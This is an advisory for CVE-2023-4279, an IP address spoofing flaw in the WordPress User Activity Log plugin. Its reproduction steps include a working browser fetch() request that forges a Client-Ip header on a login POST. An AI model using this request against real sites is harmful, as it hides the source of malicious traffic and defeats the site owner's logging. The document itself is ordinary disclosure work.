**CVE ID**: CVE-2023-4279

**Vulnerability Type**: IP Address Spoofing

**Description**: This plugin retrieves client IP addresses from potentially untrusted headers, allowing an attacker to manipulate its value. This may be used to hide the source of malicious traffic.

**Steps to reproduce**: 
```
1. In User Activity Log > Settings, enable the setting "Allow Ip Address of users to log." and save settings.

2. Run the following code in the web browser and note on the backend that the IP address has been faked.

await fetch("/wp-login.php", {
  "headers": {
    "content-type": "application/x-www-form-urlencoded",
    "Client-Ip": "8.8.8.8",
  },
  "body": "log=USERNAME&pwd=PASSWORD",
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
}); 
```


**Reference**: 
1. https://wpscan.com/vulnerability/2bd2579e-b383-4d12-b207-6fc32cfb82bc
2. https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-4279
3. https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/user-activity-log/user-activity-log-166-ip-address-spoofing
